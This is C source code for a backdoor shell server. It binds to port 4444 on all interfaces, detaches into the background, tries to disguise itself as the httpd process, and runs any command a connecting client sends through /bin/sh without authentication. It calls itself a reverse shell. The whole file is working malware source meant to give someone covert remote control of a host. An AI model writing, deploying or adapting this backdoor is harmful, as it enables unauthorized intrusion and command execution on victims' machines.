#include <arpa/inet.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include <errno.h>

void parse_command(char *buffer, char **cmd, char **args){
    *cmd = strtok(buffer, "\t\n");
    *args = strtok(NULL, "\n");
}

void handle_connection(int client_fd) {
    char buffer[1024];
    ssize_t recv_size;

    // Redirect standard file descriptors to the client socket
    dup2(client_fd, STDIN_FILENO);
    dup2(client_fd, STDOUT_FILENO);
    dup2(client_fd, STDERR_FILENO);

    while ((recv_size = recv(client_fd, buffer, sizeof(buffer) - 1, 0)) > 0) {
        buffer[recv_size] = '\0';

        char *cmd, *args;
        parse_command(buffer, &cmd, &args);

        if (strcmp(cmd, "cd") == 0) {
            if (chdir(args) == -1) {
                perror("chdir");
                send(client_fd, strerror(errno), strlen(strerror(errno)), 0);
            }
        }
        pid_t pid = fork();
        if (pid < 0) {
            perror("fork");
            continue;
        } else if (pid == 0) {
            // Child process executes the command
            execl("/bin/sh", "sh", "-c", buffer, NULL);
            perror("execl");
            exit(EXIT_FAILURE);
        } else {
            // Parent process waits for the child process to finish
            int status;
            waitpid(pid, &status, 0);
        }
    }
}

int main() {
    // Set the process name to a legitimate process
    setenv("argv[0]", "/usr/sbin/httpd", 1);

    int server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd == -1) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;

    //if port is in use by another process, increment port number by 1
    
    server_addr.sin_port = htons(4444);

    if (bind(server_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) == -1) {
        perror("bind");
        exit(EXIT_FAILURE);
    }

    if (listen(server_fd, 5) == -1) {
        perror("listen");
        exit(EXIT_FAILURE);
    }

    printf("Listening on port 4444...\n");

    // Fork the process
    pid_t pid = fork();
    if (pid < 0) {
        perror("fork");
        exit(EXIT_FAILURE);
    } else if (pid > 0) {
        // Parent process exits
        exit(EXIT_SUCCESS);
    }

    // Child process continues
    // Create a new session and set the process group ID to the child's PID
    setsid();
    setpgid(0, 0);

    // Redirect standard file descriptors to /dev/null
    int devnull = open("/dev/null", O_RDWR);
    if (devnull == -1) {
        perror("open");
        exit(EXIT_FAILURE);
    }
    dup2(devnull, STDIN_FILENO);
    dup2(devnull, STDOUT_FILENO);
    dup2(devnull, STDERR_FILENO);

    // Start the reverse shell
    struct sockaddr_in client_addr;
    socklen_t client_addr_len = sizeof(client_addr);
    int client_fd;

    while ((client_fd = accept(server_fd, (struct sockaddr *)&client_addr, &client_addr_len)) != -1) {
        printf("New connection: %s\n", inet_ntoa(client_addr.sin_addr));
        send(client_fd, "Connected to C reverse shell...\n", 32, 0);

        handle_connection(client_fd);
        close(client_fd);
    }

    perror("accept");
    exit(EXIT_FAILURE);
}
